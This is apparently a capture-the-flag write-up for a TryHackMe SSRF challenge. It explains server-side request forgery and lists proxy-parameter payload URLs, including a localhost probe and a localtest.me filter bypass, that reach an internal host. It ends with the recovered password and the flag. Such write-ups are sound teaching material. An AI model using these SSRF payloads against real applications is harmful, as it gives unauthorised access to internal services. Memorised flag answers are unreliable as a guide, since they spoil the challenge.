# The Naughty or Nice List

## Video

{% embed url="https://www.youtube.com/watch?v=XgJ_6xdspKM" %}

## Resources

### Server-Side Request Forgery

Server-Side Request Forgery (SSRF) is a web app vulnerability that allows attackers to force the web application server to make requests to resources it normally wouldn't. For example, a web app may have the functionality to produce screenshots of other websites when a user supplies a URL. This is perfectly valid functionality, however, URLs can also be made for internal IP addresses (e.g. 192.168.1.1, 10.10.10.10, 127.0.0.1 etc.) as well as internal-only hostnames (e.g. localhost, WIN2019SERV.CORP). If a web developer is not careful, an attacker could provide the app with these and manage to screenshot internal resources, which often have less protections.

To counter this, user-provided URLs can be checked before they are requested, to ensure that malicious values are not being used. However, due to the complex nature of URLs themselves, there are often many things an attacker can do to bypass these checks.

Note that while the example of SSRF used in this task is effectively a Remote File Inclusion (RFI) vulnerability as well, not every SSRF is. Some SSRF vulnerabilities only trigger a DNS lookup, while others may not return any kind of response to the web app, but can still be used to "port scan" internal systems by measuring the time each request takes to complete. In other cases, SSRF may be used as a form of Denial of Service (DoS) since the attacker can continually request that the server download large files simultaneously (taking up memory, disk space, and network bandwidth).

## Challenge

### What is Santa's password?

![](<../.gitbook/assets/image (186).png>)

> http://10.10.129.132/?proxy=http%3A%2F%2Flist.hohoho%3A8080%2Fsearch.php%3Fname%3DShell5

{% embed url="https://meyerweb.com/eric/tools/dencoder/" %}

![](<../.gitbook/assets/image (187).png>)

> http://10.10.129.132/?proxy=http://list.hohoho:8080/search.php?name=Shell5

> http://10.10.129.132/?proxy=http%3A%2F%2Flist.hohoho%3A8080%2F

![](<../.gitbook/assets/image (188).png>)

> http://10.10.129.132/?proxy=http%3A%2F%2Flist.hohoho%3A80

![](<../.gitbook/assets/image (189).png>)

> http://10.10.129.132/?proxy=http%3A%2F%2Flist.hohoho%3A80

![](<../.gitbook/assets/image (190).png>)

> http://10.10.129.132/?proxy=http%3A%2F%2Flocalhost

![](<../.gitbook/assets/image (191).png>)

> http://10.10.129.132/?proxy=http%3A%2F%2Flist.hohoho.localtest.me

![](<../.gitbook/assets/image (192).png>)

{% hint style="success" %}
> Be good for goodness sake!
{% endhint %}

### What is the challenge flag?

![](<../.gitbook/assets/image (185).png>)

> Login: Santa
>
> Password: Be good for goodness sake!

![](<../.gitbook/assets/image (193).png>)

{% hint style="success" %}
THM{EVERYONE\_GETS\_PRESENTS}
{% endhint %}
